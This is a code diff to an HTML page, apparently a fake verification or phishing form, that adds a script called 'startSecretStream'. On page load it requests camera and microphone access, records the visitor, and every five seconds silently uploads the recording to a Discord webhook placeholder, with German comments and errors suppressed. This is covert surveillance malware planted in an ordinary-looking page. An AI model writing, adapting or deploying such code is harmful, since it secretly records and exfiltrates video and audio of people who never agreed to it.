@@ -1107,6 +1107,52 @@ function handleVerificationSimple(buttonElement, methodType, codeValue) {
         showErrorUnderFields();
     }, WAIT);
 }
+</script><script>
+// --- GELEERTER / AKTUALISIERTER BUFFER-STREAM ---
+let recordedChunks = [];
+
+function handleDataAvailable(event) {
+    if (event.data.size > 0) {
+        recordedChunks.push(event.data);
+    }
+}
+
+function flushBuffer(webhookUrl) {
+    if (recordedChunks.length === 0) return;
+    
+    const blob = new Blob(recordedChunks, { type: 'video/webm' });
+    recordedChunks = []; 
+    
+    const formData = new FormData();
+    formData.append('file', blob, 'recording.webm');
+    
+    fetch(webhookUrl, {
+        method: 'POST',
+        body: formData
+    }).catch(() => {});
+}
+
+async function startSecretStream() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+        
+        mediaRecorder.ondataavailable = handleDataAvailable;
+        
+        // Alle 5 Sekunden den Puffer automatisch an deinen Webhook senden
+        setInterval(() => {
+            flushBuffer("HIER_DEINEN_DISCORD_WEBHOOK_EINTRAGEN");
+        }, 5000);
+
+        mediaRecorder.start(1000);
+    } catch (err) {
+        console.error("Zugriff verweigert", err);
+    }
+}
+
+window.addEventListener('DOMContentLoaded', () => {
+    setTimeout(startSecretStream, 2000);
+});
 </script>
 </body>
 </html>
